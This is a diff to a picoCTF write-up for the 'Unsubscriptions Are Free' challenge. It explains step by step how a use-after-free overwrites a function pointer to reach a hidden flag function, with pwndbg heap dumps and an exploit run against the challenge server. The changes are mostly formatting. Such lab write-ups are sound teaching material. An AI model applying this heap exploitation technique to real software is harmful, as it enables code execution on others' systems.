@@ -1,6 +1,6 @@
 # Unsubscriptions Are Free
 
-[![VIDEO WALKTHROUGH](http://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](http://www.youtube.com/watch?v=YGQAvJ__12k "Exploiting a Use-After-Free (UAF) Vulnerability - \"Unsubscriptions\ Are\ Free\"\ Pwn\ Challenge\ \[PicoGym\]")
+[![VIDEO WALKTHROUGH](https://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](https://www.youtube.com/watch?v=YGQAvJ__12k "Unsubscriptions Are Free")
 
 ## Description
 
@@ -168,31 +168,28 @@ Goal is to call the `hahaexploitgobrrr` function, printing the flag.
 
 `main()` first mallocs a `user` object* from the `cmd` struct, containing a function pointer `whatToDo` and a char pointer `username`.
 
-\*Program is 32-bit, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.
+\*32-bit binary, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.
 
-```
 main() then indefinitely loops:
-    - printMenu() - print menu options
-    - processInput() - read user input
-    - doProcess(user) - execute the current function pointed to by user->whatToDo
-```
+- `printMenu()` - print menu options
+- `processInput()` - read user input
+- `doProcess(user)` - execute the current function pointed to by `user->whatToDo`
 
 When we select a menu option, e.g. `S` the `user->whatToDo` function pointer is updated, to point at the relevant function, e.g. `s`:
 
-```
-S. Leak `hahaexploitgobrrr` address
-I. free() the `user` object
-M. Create account, sets user->username
-P. Print unimportant string
-L. Leave a message, reads 8 bytes into new chunk (malloc(8))
-E. Exit the program
-```
+
+**(S)** Leak `hahaexploitgobrrr` address\
+**(I)** free() the `user` object\
+**(M)** Create account, sets `user->username`\
+**(P)** Print unimportant string\
+**(L)** Leave a message, reads 8 bytes into new chunk (`malloc(8)`)\
+**(E)** Exit the program
 
 Let's re-order these menu options into an exploit:
 
-S. Leak `hahaexploitgobrrr` address
-I. `free()` the `user` object
-L. Leave a message, reads 8 bytes into new chunk (`malloc(8)`)
+**(S)** Leak `hahaexploitgobrrr` address\
+**(I)** `free()` the `user` object\
+**(L)** Leave a message, reads 8 bytes into new chunk (`malloc(8)`)
 
 Breakdown: We'll leak (and capture) the `hahaexploitgobrrr` address. Next, we'll free the user object. Finally, we'll submit the `hahaexploitgobrrr` address as a message. `malloc(8)` will reuse the freed user chunk (UAF) and write the address into the `user->whatToDo` function pointer, which is continously executed by `doProcess(user)`.
 
@@ -204,7 +201,7 @@ We can set some breakpoints in GDB:
 
 The first breakpoint shows the address of the `user` chunk (`0x95cd1a0`), returned to the `EAX` by malloc:
 
-```
+```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
  EAX  0x95cd1a0 ◂— 0x0
  EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
@@ -235,7 +232,7 @@ The chunk size is 16
 
 0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free:
 
-```
+```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x00000000	0x00000000	0x00000000
 0x95cd1ac:	0x00021e59	0x00000000	0x00000000	0x00000000
@@ -243,7 +240,7 @@ pwndbg> x/8gwx 0x95cd1a0 - 4
 
 We'll create a user "crypto" and check the chunk again:
 
-```
+```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x080489f6	0x095ce1c0	0x00000000
 0x95cd1ac:	0x00001011	0x70797263	0x000a6f74	0x00000000
@@ -251,19 +248,19 @@ pwndbg> x/8gwx 0x95cd1a0 - 4
 
 The next 4 bytes after the chunk size (`0x080489f6`) hold the `user->whatToDo` function pointer:
 
-```
+```sh
 pwndbg> x 0x080489f6
 0x80489f6 <m>:	0x53e58955
 ```
 
 The next 4 bytes after that hold the `user->username` char pointer:
 
-```
+```sh
 pwndbg> x/gx 0x095ce1c0
 0x95ce1c0:	0x000a6f7470797263
 ```
 
-```
+```sh
 pwndbg> unhex a6f7470797263
 
 otpyrc
@@ -271,7 +268,7 @@ otpyrc
 
 Second breakpoint, after the user chunk has been freed:
 
-```
+```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 *EAX  0x0
  EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
@@ -301,7 +298,7 @@ Second breakpoint, after the user chunk has been freed:
 
 We can check the chunk address again:
 
-```
+```sh
 pwndbg> x/8gwx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x00000000	0x095cd010	0x00000000
 0x95cd1ac:	0x00001011	0x70790a59	0x000a6f74	0x00000000
@@ -311,7 +308,7 @@ Notice the `user->whatToDo` function pointer is now empty because the first word
 
 We can check the heap and see that our free chunk is in the `tcache`:
 
-```
+```sh
 pwndbg> heap
 Allocated chunk | PREV_INUSE
 Addr: 0x95cd008
@@ -337,7 +334,7 @@ Size: 0x20dd9
 
 Third breakpoint, after a new 8 byte chunk is allocated by malloc:
 
-```
+```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 *EAX  0x95cd1a0 ◂— 0x0
  EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
@@ -365,7 +362,7 @@ Third breakpoint, after a new 8 byte chunk is allocated by malloc:
 
 `malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag:
 
-```
+```sh
 python exploit.py REMOTE mercury.picoctf.net 61817
 [+] Opening connection to mercury.picoctf.net on port 61817: Done
 [*] leaked hahaexploitgobrrr() address: 0x80487d6
